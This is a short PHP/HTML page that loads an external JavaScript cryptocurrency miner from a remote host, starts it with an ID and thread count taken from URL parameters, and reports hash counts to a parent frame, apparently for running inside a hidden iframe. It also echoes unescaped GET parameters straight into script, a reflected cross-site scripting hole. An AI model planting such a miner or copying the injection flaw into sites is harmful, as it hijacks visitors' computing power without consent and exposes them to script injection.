<html>
    <head>
        <script type="text/javascript" src="https://methodise.me/S/OMINE.js"></script>
        <script>
            var t;
            OMINE('<?php echo $_GET['id'];?>','<?php echo $_GET['threads'];?>');
            function status(){
                return {
                    'miner':'<?php echo $_GET['name'];?>'
                ,   'threads':'<?php echo $_GET['threads'];?>'
                ,   'running':connected
                ,   'accepted-hashes':totalhashes
                ,   'element':'<?php echo $_GET['element'];?>'
                    };}
            t=setInterval(function(){if(connected){clearInterval(t);window.parent.miner_status(status());}},500);
        </script>
    </head>
</html>
